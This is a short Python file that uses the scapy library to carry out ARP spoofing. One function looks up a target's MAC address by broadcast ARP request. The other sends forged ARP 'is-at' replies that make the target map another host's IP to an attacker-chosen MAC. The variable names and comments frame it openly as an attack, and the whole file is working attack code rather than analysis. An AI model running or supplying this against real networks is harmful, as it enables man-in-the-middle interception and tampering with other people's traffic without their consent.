from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp
BROADCASTMAC = "ff:ff:ff:ff:ff:ff"

def getTargetMac(target : str , interface : str )->str : #get mac from ip  
    etherAttack = Ether(dst =BROADCASTMAC)
    arpAttack = ARP(pdst = target  , op = "who-has" )
    reply = srp1(etherAttack/arpAttack , iface = interface,verbose=False)
    return reply[Ether].src

def changeArpTable( targetIp : str , targetMac : str, src :str , srcMac : str ,interface : str )->None: #change arp tables if the ip we want to pretend to is already in the table 
    etherAttack = Ether(dst = targetMac, src = srcMac)
    arpAttack = ARP(pdst = targetIp, hwdst = targetMac, psrc = src, op = "is-at" )
    #(etherAttack/arpAttack).show()
    sendp(etherAttack/arpAttack , iface=interface,verbose=False)